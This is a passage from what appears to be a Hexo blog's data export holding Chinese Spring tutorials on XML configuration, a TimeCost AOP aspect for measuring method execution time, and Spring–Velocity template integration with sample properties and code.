class=\"attr\">ignore-resource-not-found</span>=<span class=\"string\">\"true\"</span> <span class=\"attr\">location</span>=<span class=\"string\">\"classpath*:app.properties\"</span> /&gt;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">&lt;!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 --&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">context:component-scan</span> <span class=\"attr\">base-package</span>=<span class=\"string\">\"com.martinye.demo\"</span> <span class=\"attr\">use-default-filters</span>=<span class=\"string\">\"true\"</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">context:include-filter</span> <span class=\"attr\">type</span>=<span class=\"string\">\"annotation\"</span> <span class=\"attr\">expression</span>=<span class=\"string\">\"org.aspectj.lang.annotation.Aspect\"</span>/&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">context:exclude-filter</span> <span class=\"attr\">type</span>=<span class=\"string\">\"annotation\"</span> <span class=\"attr\">expression</span>=<span class=\"string\">\"org.springframework.stereotype.Controller\"</span> /&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">context:exclude-filter</span> <span class=\"attr\">type</span>=<span class=\"string\">\"annotation\"</span> <span class=\"attr\">expression</span>=<span class=\"string\">\"org.springframework.web.bind.annotation.ControllerAdvice\"</span> /&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">context:component-scan</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">aop:aspectj-autoproxy</span> <span class=\"attr\">expose-proxy</span>=<span class=\"string\">\"true\"</span> <span class=\"attr\">proxy-target-class</span>=<span class=\"string\">\"false\"</span>/&gt;</span></div></pre></td></tr></table></figure></p>\n<p><strong>配置描述</strong>：</p>\n<ol>\n<li><p>加载配置资源：app.properties。</p>\n</li>\n<li><p>启用注解功能<br>除Controller以外的Component注解注释的类，自动注入@Required, @Autowired, @PostConstruct, @PreDestroy, @Resource, @PersistenceContext and @PersistenceUnit注释的属性。</p>\n</li>\n<li><p>开启aop，启用@AspectJ注解。<br>在注入当前容器的类对象方法上，支持AOP注解。</p>\n</li>\n</ol>\n<h2 id=\"四、配置spring-mvc-xml\"><a href=\"#四、配置spring-mvc-xml\" class=\"headerlink\" title=\"四、配置spring-mvc.xml\"></a>四、配置spring-mvc.xml</h2><p>配置如下：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">context:property-placeholder</span> <span class=\"attr\">ignore-resource-not-found</span>=<span class=\"string\">\"true\"</span> <span class=\"attr\">location</span>=<span class=\"string\">\"classpath*:app.properties\"</span> /&gt;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">&lt;!-- 使用annotation 自动注册bean, 并保证@Required、@Autowired的属性被注入 --&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">context:component-scan</span> <span class=\"attr\">base-package</span>=<span class=\"string\">\"com.martinye.demo\"</span> <span class=\"attr\">use-default-filters</span>=<span class=\"string\">\"false\"</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">context:include-filter</span> <span class=\"attr\">type</span>=<span class=\"string\">\"annotation\"</span> <span class=\"attr\">expression</span>=<span class=\"string\">\"org.aspectj.lang.annotation.Aspect\"</span>/&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">context:include-filter</span> <span class=\"attr\">type</span>=<span class=\"string\">\"annotation\"</span> <span class=\"attr\">expression</span>=<span class=\"string\">\"org.springframework.stereotype.Controller\"</span> /&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">context:include-filter</span> <span class=\"attr\">type</span>=<span class=\"string\">\"annotation\"</span> <span class=\"attr\">expression</span>=<span class=\"string\">\"org.springframework.web.bind.annotation.ControllerAdvice\"</span> /&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">context:component-scan</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">&lt;!-- Resolves views selected for rendering by @Controllers to .jsp resources in the /WEB-INF/views directory --&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">class</span>=<span class=\"string\">\"org.springframework.web.servlet.view.InternalResourceViewResolver\"</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">\"prefix\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"/WEB-INF/views/\"</span> /&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">\"suffix\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\".jsp\"</span> /&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">aop:aspectj-autoproxy</span> <span class=\"attr\">expose-proxy</span>=<span class=\"string\">\"true\"</span> <span class=\"attr\">proxy-target-class</span>=<span class=\"string\">\"false\"</span>/&gt;</span></div></pre></td></tr></table></figure></p>\n<p><strong>配置描述</strong>：</p>\n<ol>\n<li><p>加载配置资源：app.properties。</p>\n</li>\n<li><p>启用注解功能<br>禁用默认的包扫描过滤策略，只扫描Controller注解。</p>\n</li>\n<li><p>开启aop，启用@AspectJ注解。<br>在注入当前容器的类对象方法上，支持AOP注解。</p>\n</li>\n</ol>\n<h2 id=\"五、创建TimeCost注解\"><a href=\"#五、创建TimeCost注解\" class=\"headerlink\" title=\"五、创建TimeCost注解\"></a>五、创建TimeCost注解</h2><p>通过注解来开关是否需要进行方法耗时统计。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">package</span> com.martinye.demo.support.annotation;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.ElementType;</div><div class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.Retention;</div><div class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.RetentionPolicy;</div><div class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.Target;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/**</div><div class=\"line\"> * <span class=\"doctag\">@description</span></div><div class=\"line\"> * </div><div class=\"line\"> * <span class=\"doctag\">@author</span> yeshaoting</div><div class=\"line\"> * <span class=\"doctag\">@date</span> 2015-05-07 13:45:29</div><div class=\"line\"> */</span></div><div class=\"line\"><span class=\"meta\">@Target</span>(&#123;ElementType.METHOD&#125;)</div><div class=\"line\"><span class=\"meta\">@Retention</span>(RetentionPolicy.RUNTIME)</div><div class=\"line\"><span class=\"keyword\">public</span> <span class=\"meta\">@interface</span> TimeCost &#123;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<h2 id=\"六、创建TimeCost切面\"><a href=\"#六、创建TimeCost切面\" class=\"headerlink\" title=\"六、创建TimeCost切面\"></a>六、创建TimeCost切面</h2><p>切面检测加有TimeCost的方法。</p>\n<p>为了保证统计完整性，防止多个切面逻辑耗时未计算的问题，我们为切面添加切面优先级。<br>此优先级通过在切面类上添加<code>@Order</code>注解来完成。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">package</span> com.martinye.demo.support.aspect;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.lang3.time.StopWatch;</div><div class=\"line\"><span class=\"keyword\">import</span> org.aspectj.lang.JoinPoint;</div><div class=\"line\"><span class=\"keyword\">import</span> org.aspectj.lang.ProceedingJoinPoint;</div><div class=\"line\"><span class=\"keyword\">import</span> org.aspectj.lang.Signature;</div><div class=\"line\"><span class=\"keyword\">import</span> org.aspectj.lang.annotation.After;</div><div class=\"line\"><span class=\"keyword\">import</span> org.aspectj.lang.annotation.AfterReturning;</div><div class=\"line\"><span class=\"keyword\">import</span> org.aspectj.lang.annotation.AfterThrowing;</div><div class=\"line\"><span class=\"keyword\">import</span> org.aspectj.lang.annotation.Around;</div><div class=\"line\"><span class=\"keyword\">import</span> org.aspectj.lang.annotation.Aspect;</div><div class=\"line\"><span class=\"keyword\">import</span> org.aspectj.lang.annotation.Before;</div><div class=\"line\"><span class=\"keyword\">import</span> org.aspectj.lang.annotation.Pointcut;</div><div class=\"line\"><span class=\"keyword\">import</span> org.slf4j.Logger;</div><div class=\"line\"><span class=\"keyword\">import</span> org.slf4j.LoggerFactory;</div><div class=\"line\"><span class=\"keyword\">import</span> org.springframework.core.annotation.Order;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/**</div><div class=\"line\"> * <span class=\"doctag\">@description</span> 方法耗时切面</div><div class=\"line\"> * </div><div class=\"line\"> * <span class=\"doctag\">@author</span> yeshaoting</div><div class=\"line\"> * <span class=\"doctag\">@date</span> 2015-06-11 11:18:06</div><div class=\"line\"> */</span></div><div class=\"line\"><span class=\"meta\">@Aspect</span></div><div class=\"line\"><span class=\"meta\">@Order</span>(<span class=\"number\">8</span>)</div><div class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TimeCostAspect</span> </span>&#123;</div><div class=\"line\">  </div><div class=\"line\">  <span class=\"keyword\">private</span> Logger logger = LoggerFactory.getLogger(<span class=\"keyword\">this</span>.getClass());</div><div class=\"line\">  </div><div class=\"line\">  <span class=\"meta\">@Pointcut</span>(<span class=\"string\">\"@annotation(com.martinye.demo.support.annotation.TimeCost)\"</span>)</div><div class=\"line\">  <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">point</span><span class=\"params\">()</span> </span>&#123;&#125;;</div><div class=\"line\">  </div><div class=\"line\">  <span class=\"meta\">@Before</span>(value = <span class=\"string\">\"point()\"</span>)</div><div class=\"line\">  <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">beforeAdvice</span><span class=\"params\">(JoinPoint joinPoint)</span> </span>&#123;</div><div class=\"line\">    logger.info(<span class=\"string\">\"======= before advice &#123;&#125; ======\"</span>, joinPoint.getSignature().getName());</div><div class=\"line\">  &#125;</div><div class=\"line\">  </div><div class=\"line\">  <span class=\"meta\">@After</span>(value = <span class=\"string\">\"point()\"</span>)</div><div class=\"line\">  <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">afterAdvice</span><span class=\"params\">(JoinPoint joinPoint)</span> </span>&#123;</div><div class=\"line\">    logger.info(<span class=\"string\">\"======= after advice &#123;&#125; ======\"</span>, joinPoint.getSignature().getName());</div><div class=\"line\">  &#125;</div><div class=\"line\">  </div><div class=\"line\">  <span class=\"meta\">@Around</span>(value = <span class=\"string\">\"point()\"</span>)</div><div class=\"line\">  <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">aroundAdvice</span><span class=\"params\">(ProceedingJoinPoint joinPoint)</span> <span class=\"keyword\">throws</span> Throwable </span>&#123;</div><div class=\"line\">    logger.info(<span class=\"string\">\"======= before around advice &#123;&#125; ======\"</span>, joinPoint.getSignature().getName());</div><div class=\"line\">    </div><div class=\"line\">    StopWatch clock = <span class=\"keyword\">new</span> StopWatch();</div><div class=\"line\">    clock.start(); <span class=\"comment\">// 计时开始</span></div><div class=\"line\">    </div><div class=\"line\">    <span class=\"keyword\">try</span> &#123;</div><div class=\"line\">      joinPoint.proceed();</div><div class=\"line\">    &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</div><div class=\"line\">      <span class=\"keyword\">throw</span> e;</div><div class=\"line\">    &#125; <span class=\"keyword\">finally</span> &#123;</div><div class=\"line\">      clock.stop(); <span class=\"comment\">// 计时结束</span></div><div class=\"line\">      <span class=\"keyword\">long</span> timeCost = clock.getTime();</div><div class=\"line\">      Signature sig = joinPoint.getSignature();</div><div class=\"line\">      logger.info(<span class=\"string\">\"execute method &#123;&#125;.&#123;&#125; take time: &#123;&#125;(ms)\"</span>, sig.getDeclaringTypeName(),</div><div class=\"line\">          sig.getName(), timeCost);</div><div class=\"line\">      </div><div class=\"line\">      logger.info(<span class=\"string\">\"======= after around advice &#123;&#125; ======\"</span>, joinPoint.getSignature().getName());</div><div class=\"line\">    &#125;</div><div class=\"line\">    </div><div class=\"line\">  &#125;</div><div class=\"line\">  </div><div class=\"line\">  <span class=\"meta\">@AfterThrowing</span>(value = <span class=\"string\">\"point()\"</span>, throwing = <span class=\"string\">\"e\"</span>)</div><div class=\"line\">  <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">afterThrowingAdvice</span><span class=\"params\">(JoinPoint joinPoint, Throwable e)</span> </span>&#123;</div><div class=\"line\">    logger.info(<span class=\"string\">\"======= after throwing advice &#123;&#125; ======\"</span>, joinPoint.getSignature().getName());</div><div class=\"line\">    logger.info(<span class=\"string\">\" &gt; error info：\"</span> + e.getMessage());</div><div class=\"line\">  &#125;</div><div class=\"line\">  </div><div class=\"line\">  <span class=\"meta\">@AfterReturning</span>(value = <span class=\"string\">\"point()\"</span>)</div><div class=\"line\">  <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">afteReturningAdvice</span><span class=\"params\">(JoinPoint joinPoint)</span> </span>&#123;</div><div class=\"line\">    logger.info(<span class=\"string\">\"======= after returning advice &#123;&#125; ======\"</span>, joinPoint.getSignature().getName());</div><div class=\"line\">  &#125;</div><div class=\"line\">  </div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>"},{"title":"spring整合实践 - velocity","date":"2015-12-29T05:58:00.000Z","_content":"\n<img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\" />\n\n\n此段内容说明如何整合spring与velocity。\n此文并不介绍如何使用velocity代替jsp作为页面渲染配置(参考：VelocityAndSpringStepByStep)，仅仅只是输出特定格式的html、xml或文本等内容的整合实践。\n\n\n## 一、配置spring mvc\n首先，web.xml添加spring容器配置:spring-beans.xml, spring-mvc.xml.\n\n\n## velocity engine实例化\n对于spring父容器spring-beans.xml，除开启注解，注入配置文件等基本配置外，向容器添加velocity engine对象定义，注入velocityEngine对象。\n\n具体配置片段如下：\n``` xml\n  <bean id=\"velocityEngine\" class=\"org.springframework.ui.velocity.VelocityEngineFactoryBean\">\n    <property name=\"resourceLoaderPath\" value=\"/WEB-INF/vm/\" />\n    <property name=\"configLocation\" value=\"classpath:velocity.properties\" />\n  </bean>\n```\n\n其中，将velocity模板放置在/martinye-demo-spring-velocity/src/main/webapp/WEB-INF/vm目录，将velocity.properties文件放置在/martinye-demo-spring-velocity/src/main/resources目录。\n**注**：vm模板也可以放置到src/main/resources目录下。\n\n\n<!-- more -->\n\n## 二、velocity配置\nvelocity.properties配置会覆盖默认配置。\n默认配置文件的位置：velocity.jar包路径org.apache.velocity.runtime.defaults下（velocity.properties）。\n\n更详细参数配置可参考：configuring_resource_loaders\n\n根据需要我们自定义的配置文件内容，如下所示：\n``` properties\n\n# encoding\ninput.encoding=UTF-8\noutput.encoding=UTF-8\ncontentType=text/html;charset=UTF-8\n\n\n# autoreload when vm changed\nfile.resource.loader.cache=false\nfile.resource.loader.modificationCheckInterval=1\nvelocimacro.library.autoreload=true\n\n\n# macro config\n# 默认情况，velocimacro.library相对于resourceLoaderPath目录\nvelocimacro.library=macro.vm\n#velocimacro.permissions.allow.inline=true\n#velocimacro.permissions.allow.inline.to.replace.global=false\n#velocimacro.permissions.allow.inline.local.scope=false\n\n#layout\n#tools.view.servlet.layout.directory=/WEB-INF/vm/layout/\n#tools.view.servlet.error.template=/WEB-INF/vm/error.vm\n#tools.view.servlet.layout.default.template=default.vm\n\n\n# runtime log\nruntime.log=velocity.log\nruntime.log.logsystem.class=org.springframework.ui.velocity.CommonsLoggingLogSystem\nruntime.log.error.stacktrace=true\nruntime.log.warn.stacktrace=true\nruntime.log.info.stacktrace=false\nruntime.log.invalid.reference=true\n\n```\n\n\n## 三、简单模板\n``` xml\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"/>\n  <title>$!title</title>\n</head>\n<body>\n  <h1>标题：$!title</h1>\n  <div>\n    <p>内容：$!content</p>\n    <p>macro函数测试：#test()</p>\n  </div>\n</body>\n</html>\n```\n\n\n## 四、模板渲染\n使用VelocityEngineUtils能很方便的merge template。\n需要准备一个Map，用于传递变量到VLT中。\n\n**代码样例**：\n``` java\n    Map<String, Object> model = Maps.newHashMap();\n    model.put(\"title\", \"Velocity Template\");\n    model.put(\"content\", \"Content in Velocity Template\");\n    \n    String text = VelocityEngineUtils.mergeTemplateIntoString(velocityEngine, \"test.vm\", Constants.ENCODING, model);\n```\n\n## 五、参考文档\n1. [VelocityAndSpringStepByStep](http://wiki.apache.org/velocity/VelocityAndSpringStepByStep)\n2. [velocity.properties配置说明](http://mj4d.iteye.com/blog/1524050)\n3. [springmvc 3.1整合velocity](http://blog.csdn.net/glarystar/article/details/6636574)\n4. [configuring_resource_loaders](http://velocity.apache.org/engine/releases/velocity-1.5/developer-guide.html#configuring_resource_loaders)\n\n","source":"_posts/article/spring/spring整合实践 - velocity.md","raw":"categories:\n  - 后端开发\ntags:\n  - spring\n  - java\n  - 实践\n  - velocity\ntitle: spring整合实践 - velocity\ndate: 2015-12-29 13:58:00\n---\n\n<img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\" />\n\n\n此段内容说明如何整合spring与velocity。\n此文并不介绍如何使用velocity代替jsp作为页面渲染配置(参考：VelocityAndSpringStepByStep)，仅仅只是输出特定格式的html、xml或文本等内容的整合实践。\n\n\n## 一、配置spring mvc\n首先，web.xml添加spring容器配置:spring-beans.xml, spring-mvc.xml.\n\n\n## velocity engine实例化\n对于spring父容器spring-beans.xml，除开启注解，注入配置文件等基本配置外，向容器添加velocity engine对象定义，注入velocityEngine对象。\n\n具体配置片段如下：\n``` xml\n  <bean id=\"velocityEngine\" class=\"org.springframework.ui.velocity.VelocityEngineFactoryBean\">\n    <property name=\"resourceLoaderPath\" value=\"/WEB-INF/vm/\" />\n    <property name=\"configLocation\" value=\"classpath:velocity.properties\" />\n  </bean>\n```\n\n其中，将velocity模板放置在/martinye-demo-spring-velocity/src/main/webapp/WEB-INF/vm目录，将velocity.properties文件放置在/martinye-demo-spring-velocity/src/main/resources目录。\n**注**：vm模板也可以放置到src/main/resources目录下。\n\n\n<!-- more -->\n\n## 二、velocity配置\nvelocity.properties配置会覆盖默认配置。\n默认配置文件的位置：velocity.jar包路径org.apache.velocity.runtime.defaults下（velocity.properties）。\n\n更详细参数配置可参考：configuring_resource_loaders\n\n根据需要我们自定义的配置文件内容，如下所示：\n``` properties\n\n# encoding\ninput.encoding=UTF-8\noutput.encoding=UTF-8\ncontentType=text/html;charset=UTF-8\n\n\n# autoreload when vm changed\nfile.resource.loader.cache=false\nfile.resource.loader.modificationCheckInterval=1\nvelocimacro.library.autoreload=true\n\n\n# macro config\n# 默认情况，velocimacro.library相对于resourceLoaderPath目录\nvelocimacro.library=macro.vm\n#velocimacro.permissions.allow.inline=true\n#velocimacro.permissions.allow.inline.to.replace.global=false\n#velocimacro.permissions.allow.inline.local.scope=false\n\n#layout\n#tools.view.servlet.layout.directory=/WEB-INF/vm/layout/\n#tools.view.servlet.error.template=/WEB-INF/vm/error.vm\n#tools.view.servlet.layout.default.template=default.vm\n\n\n# runtime log\nruntime.log=velocity.log\nruntime.log.logsystem.class=org.springframework.ui.velocity.CommonsLoggingLogSystem\nruntime.log.error.stacktrace=true\nruntime.log.warn.stacktrace=true\nruntime.log.info.stacktrace=false\nruntime.log.invalid.reference=true\n\n```\n\n\n## 三、简单模板\n``` xml\n<html>\n<head>\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"/>\n  <title>$!title</title>\n</head>\n<body>\n  <h1>标题：$!title</h1>\n  <div>\n    <p>内容：$!content</p>\n    <p>macro函数测试：#test()</p>\n  </div>\n</body>\n</html>\n```\n\n\n## 四、模板渲染\n使用VelocityEngineUtils能很方便的merge template。\n需要准备一个Map，用于传递变量到VLT中。\n\n**代码样例**：\n``` java\n    Map<String, Object> model = Maps.newHashMap();\n    model.put(\"title\", \"Velocity Template\");\n    model.put(\"content\", \"Content in Velocity Template\");\n    \n    String text = VelocityEngineUtils.mergeTemplateIntoString(velocityEngine, \"test.vm\", Constants.ENCODING, model);\n```\n\n## 五、参考文档\n1. [VelocityAndSpringStepByStep](http://wiki.apache.org/velocity/VelocityAndSpringStepByStep)\n2. [velocity.properties配置说明](http://mj4d.iteye.com/blog/1524050)\n3. [springmvc 3.1整合velocity](http://blog.csdn.net/glarystar/article/details/6636574)\n4. [configuring_resource_loaders](http://velocity.apache.org/engine/releases/velocity-1.5/developer-guide.html#configuring_resource_loaders)\n\n","slug":"article/spring/spring整合实践 - velocity","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxub00655nbtpt740kps","content":"<p><img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\"></p>\n<p>此段内容说明如何整合spring与velocity。<br>此文并不介绍如何使用velocity代替jsp作为页面渲染配置(参考：VelocityAndSpringStepByStep)，仅仅只是输出特定格式的html、xml或文本等内容的整合实践。</p>\n<h2 id=\"一、配置spring-mvc\"><a href=\"#一、配置spring-mvc\" class=\"headerlink\" title=\"一、配置spring mvc\"></a>一、配置spring mvc</h2><p>首先，web.xml添加spring容器配置:spring-beans.xml, spring-mvc.xml.</p>\n<h2 id=\"velocity-engine实例化\"><a href=\"#velocity-engine实例化\" class=\"headerlink\" title=\"velocity engine实例化\"></a>velocity engine实例化</h2><p>对于spring父容器spring-beans.xml，除开启注解，注入配置文件等基本配置外，向容器添加velocity engine对象定义，注入velocityEngine对象。</p>\n<p>具体配置片段如下：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">\"velocityEngine\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"org.springframework.ui.velocity.VelocityEngineFactoryBean\"</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">\"resourceLoaderPath\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"/WEB-INF/vm/\"</span> /&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">\"configLocation\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"classpath:velocity.properties\"</span> /&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>其中，将velocity模板放置在/martinye-demo-spring-velocity/src/main/webapp/WEB-INF/vm目录，将velocity.properties文件放置在/martinye-demo-spring-velocity/src/main/resources目录。<br><strong>注</strong>：vm模板也可以放置到src/main/resources目录下。</p>\n<a id=\"more\"></a>\n<h2 id=\"二、velocity配置\"><a href=\"#二、velocity配置\" class=\"headerlink\" title=\"二、velocity配置\"></a>二、velocity配置</h2><p>velocity.properties配置会覆盖默认配置。<br>默认配置文件的位置：velocity.jar包路径org.apache.velocity.runtime.defaults下（velocity.properties）。</p>\n<p>更详细参数配置可参考：configuring_resource_loaders</p>\n<p>根据需要我们自定义的配置文件内容，如下所示：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div></pre></td><td class=\"code\"><pre><div class=\"line\"></div><div class=\"line\"># encoding</div><div class=\"line\">input.encoding=UTF-8</div><div class=\"line\">output.encoding=UTF-8</div><div class=\"line\">contentType=text/html;charset=UTF-8</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"># autoreload when vm changed</div><div class=\"line\">file.resource.loader.cache=false</div><div class=\"line\">file.resource.loader.modificationCheckInterval=1</div><div class=\"line\">velocimacro.library.autoreload=true</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"># macro config</div><div class=\"line\"># 默认情况，velocimacro.library相对于resourceLoaderPath目录</div><div class=\"line\">velocimacro.library=macro.vm</div><div class=\"line\">#velocimacro.permissions.allow.inline=true</div><div class=\"line\">#velocimacro.permissions.allow.inline.to.replace.global=false</div><div class=\"line\">#velocimacro.permissions.allow.inline.local.scope=false</div><div class=\"line\"></div><div class=\"line\">#layout</div><div class=\"line\">#tools.view.servlet.layout.directory=/WEB-INF/vm/layout/</div><div class=\"line\">#tools.view.servlet.error.template=/WEB-INF/vm/error.vm</div><div class=\"line\">#tools.view.servlet.layout.default.template=default.vm</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"># runtime log</div><div class=\"line\">runtime.log=velocity.log</div><div class=\"line\">runtime.log.logsystem.class=org.springframework.ui.velocity.CommonsLoggingLogSystem</div><div class=\"line\">runtime.log.error.stacktrace=true</div><div class=\"line\">runtime.log.warn.stacktrace=true</div><div class=\"line\">runtime.log.info.stacktrace=false</div><div class=\"line\">runtime.log.invalid.reference=true</div></pre></td></tr></table></figure></p>\n<h2 id=\"三、简单模板\"><a href=\"#三、简单模板\" class=\"headerlink\" title=\"三、简单模板\"></a>三、简单模板</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></div><div 